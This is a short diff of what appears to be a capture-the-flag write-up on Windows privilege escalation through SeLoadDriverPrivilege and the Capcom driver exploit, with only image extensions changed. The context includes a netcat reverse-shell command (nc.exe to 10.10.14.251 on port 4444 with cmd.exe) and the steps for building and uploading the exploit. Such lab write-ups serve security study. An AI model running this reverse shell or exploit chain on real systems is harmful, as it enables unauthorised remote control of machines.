@@ -268,11 +268,11 @@ SeLoadDriverPrivilege         Load and unload device drivers Enabled
 
 Okay, first things first, we'll grab the two tools from GitHub that we will need to compile ourselves mentioned in the Tarlogic article. The first one will compile into an executable called `LOADDRIVER.exe`. This program should suffice as is. We'll use Visual Studios 2019 to edit and compile our projects.
 
-![](images/loaddriver.png)
+![](images/loaddriver.PNG)
 
 Once that's compiled, we'll move to the executable `ExploitCapcom.exe`. We'll need to make a change to the `LaunchShell()` function to run our desired command in a privileged context. We'll create a simple batch file (`C:\temp\nc.exe 10.10.14.251 4444 -e cmd.exe`) that will run a `netcat` command to open a reverse shell. We'll add the command to execute the batch file at line 292. Once that's done we'll compile it.
 
-![](images/exploitcapcom.png)
+![](images/exploitcapcom.PNG)
 
 Okay, we've got our files. Let's upload them to a `temp` directory on the victim machine with `evil-winrm`. We'll have to upload a `netcat` executable as well so that our batch file works.
 
